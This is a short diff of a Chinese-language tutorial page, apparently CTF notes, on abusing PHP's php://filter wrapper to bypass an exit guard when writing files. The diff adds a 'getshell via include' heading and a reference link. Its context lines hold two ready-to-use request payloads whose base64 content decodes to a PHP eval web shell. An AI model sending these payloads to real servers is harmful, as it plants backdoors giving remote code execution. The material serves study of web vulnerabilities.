@@ -289,6 +289,7 @@
 <li>base64<br>Base64编码由64个可打印ASCII字符（A-Z、a-z、0-9、+、/）组成，解码时是4个byte一组<br>而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符<br>则外加部分满足4个byte一组，就不会影响后续解码<br><code>?filename=php://filter/convert.base64-decode/resource=1.php&amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</code>其中phpexita被解成乱码</li>
 </ol>
 <p>也可以先使用strip_tags去除 HTML 和 PHP 标记<br><code>?filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=3.php&amp;content=?&gt;PD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</code></p>
+<h3 id="直接包含getshell"><a href="#直接包含getshell" class="headerlink" title="直接包含getshell"></a>直接包含getshell</h3><p>膜拜<code>https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</code></p>
 
         </div>
 
